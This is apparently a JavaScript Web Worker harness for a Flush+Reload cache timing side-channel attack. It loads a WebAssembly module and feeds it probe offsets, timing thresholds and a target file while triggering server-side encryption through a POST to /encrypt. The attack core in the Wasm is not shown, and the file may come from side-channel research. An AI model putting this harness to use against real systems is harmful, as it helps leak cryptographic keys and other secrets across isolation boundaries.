async function getTargetArrayBuffer() {
  const response = await fetch("/target_file")
  return new Uint8Array(await response.arrayBuffer())
}

async function getConfig() {
  const response = await fetch("/config")
  const configString = await response.text()
  const config = {
    threshold: 0,
    wait_cycles: 0,
    time_slots: 0 ,
    time_slot_size: 0, 
    target_file: "",
    probe: []
  }
  const lines = configString.split('\n');
  for(let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if(line.length == 0) continue
    const [key, value] = line.split(' ')
    if(key == "probe") {
      config.probe.push(Number(value))
    } else if(key == "target_file") {
      config.target_file = value
    } else {
      config[key] = Number(value)
    }
  }
  return config
}

function encrypt() {
  fetch("/encrypt", {method: "POST"})
}

function random() {
  return Math.random()
}

let buffer = null;

function getTime() {
  return buffer.getBigUint64(1, true)
}

function copyMemory(data, instance) {
  let ptr = instance.exports.alloc(data.length)
  let mem = new Uint8Array(instance.exports.memory.buffer, ptr, data.length);
  mem.set(new Uint8Array(data));
  return ptr
}

function copyMemory32(data, instance) {
  let ptr = instance.exports.alloc(data.length * 4)
  let mem = new Uint32Array(instance.exports.memory.buffer, ptr, data.length);
  const buffer = new DataView(instance.exports.memory.buffer);
  console.log(buffer.getUint32(ptr, true))
  mem.set(new Uint32Array(data));
  return ptr
}

self.onmessage = async (event) => {
  let target = await getTargetArrayBuffer();
  let config = await getConfig();
  const {module, memory} = event.data;
  const instance = new WebAssembly.Instance(module, {
    env: {
      memory: memory
    },
    js: {
      getTime: getTime,
      encrypt: encrypt,
      random: random,
      log: console.log
    }
  });
  const buffer = new Uint8Array(memory.buffer);
  console.log("__data_end:", instance.exports.__data_end.value)
  console.log("__heap_base:", instance.exports.__heap_base.value)
  console.log("memory size:", buffer.byteLength)
  // allocate probe (u32)
  // allocate probe (u8)
  const probes = new Uint32Array(config.probe)
  const probe_ptr = copyMemory32(probes, instance);
  const target_ptr = copyMemory(target, instance);
  const box_u32_length = config.probe.length * config.time_slots;
  const box_u32_ptr = instance.exports.flush_reload(config.threshold, config.time_slots, config.wait_cycles, config.time_slot_size, config.probe, config.probe.length, probe_ptr, config.probe.length, target_ptr, target.length)
}
